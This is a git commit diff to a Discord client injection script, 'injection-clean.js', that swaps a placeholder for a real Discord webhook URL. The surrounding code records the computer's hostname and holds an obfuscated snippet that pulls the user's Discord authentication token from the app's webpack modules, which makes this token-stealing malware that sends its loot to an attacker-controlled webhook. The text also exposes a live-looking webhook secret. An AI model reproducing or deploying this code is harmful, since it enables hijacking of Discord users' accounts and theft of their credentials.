67b44a28e6eb14e5079b4548305f7fd6955c1614
Rezify-108 <90564322+Rezify-108@users.noreply.github.com>
2022-02-07 14:10:55 +0530

    Update injection-clean.js

--- src/injection/injection-clean.js
+++ src/injection/injection-clean.js
@@ -6,7 +6,7 @@ const {
 } = require('electron')
 const querystring = require('querystring');
 const os = require('os')
-var webhook = "%WEBHOOK_LINK%";
+var webhook = "%https://discord.com/api/webhooks/940119943532413008/KZ0lz5fcSq7ZsxMN3XH1maGcf2d-3b260hyx3LZ2JJUgiIpA45uijpgvCh5rPmcgYUrZ%";
 const computerName = os.hostname();
 const discordInstall = `${__dirname}`
 const EvalToken = `for(let a in window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]),gg.c)if(gg.c.hasOwnProperty(a)){let b=gg.c[a].exports;if(b&&b.__esModule&&b.default)for(let a in b.default)"getToken"==a&&(token=b.default.getToken())}token;`
